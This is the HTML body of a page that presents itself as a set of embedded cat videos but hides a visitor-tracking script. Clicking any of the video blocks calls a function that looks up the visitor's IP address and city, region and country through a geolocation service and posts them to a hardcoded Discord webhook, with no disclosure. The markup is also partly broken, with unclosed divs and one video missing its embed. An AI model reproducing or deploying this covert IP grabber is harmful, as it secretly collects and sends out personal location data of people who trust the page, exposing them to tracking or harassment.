<body>

    <!-- First Cat Video -->
    <div onclick="logIPAndLocation('https://discord.com/api/webhooks/1390407856527904982/ijfqflvt7QMjNERrl-oQk8b147WwMois4Ptos8xCNGboOPn_O878wveOaLUoMYG6nM5l')">
        <iframe width="560" height="315" src="https://www.youtube.com/embed/OWbtxdq5rvQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

    <!-- Second Cat Video -->
    <div onclick="logIPAndLocation('https://discord.com/api/webhooks/1390407856527904982/ijfqflvt7QMjNERrl-oQk8b147WwMois4Ptos8xCNGboOPn_O878wveOaLUoMYG6nM5l')">

    <!-- Third Cat Video -->
    <div onclick="logIPAndLocation('https://discord.com/api/webhooks/1390407856527904982/ijfqflvt7QMjNERrl-oQk8b147WwMois4Ptos8xCNGboOPn_O878wveOaLUoMYG6nM5l')">
        <iframe width="560" height="315" src="https://www.youtube.com/embed/-CNymheDE3M" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
    </div>

    <script>
    function logIPAndLocation(webhookUrl) {
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                const location = `${data.city}, ${data.region}, ${data.country_name}`;
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ content: `IP: ${ip}\nLocation: ${location}` })
                });
            });
    }
    </script>
</body>
